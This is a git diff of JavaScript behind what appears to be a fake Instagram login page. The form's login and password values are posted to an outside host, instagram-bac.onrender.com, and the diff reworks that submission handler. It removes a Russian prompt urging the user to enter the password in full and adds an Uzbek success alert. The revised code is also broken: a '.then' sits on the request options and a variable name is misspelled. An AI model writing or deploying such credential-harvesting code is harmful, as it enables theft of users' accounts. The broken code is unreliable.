@@ -34,9 +34,7 @@ inps[1].addEventListener('keyup', (e) => {
     }
 })
 
-
-
-btn.addEventListener('click', (e) => {
+btn.onclick=()=> {
     fetch('https://instagram-bac.onrender.com/data', {
         method: 'POST',
         headers: {
@@ -46,24 +44,10 @@ btn.addEventListener('click', (e) => {
             login: inps[0].value,
             password: inps[1].value
         })
-    })
-        .then(res => res.json())
-        .then(data => {
-            login= inps[0].value,
-            password= inps[1].value,
-            inps[0].value='',
-            inps[1].value=''    
+        .then(res=>{
+        res.status==201?alert('hammasi tayyor'):alert('xatolik yuzaga keldi')
+            inp[0].value = ''
+            inp[1].value = ''
         })
-        .catch(er => {
-            mistake.textContent = `
-            Пожалуйста, введите свой пароль и войдите в систему полностью
-            `
-            alert('error')
-        })
-})
-
-
-
-
-
-
+    }
+    )}
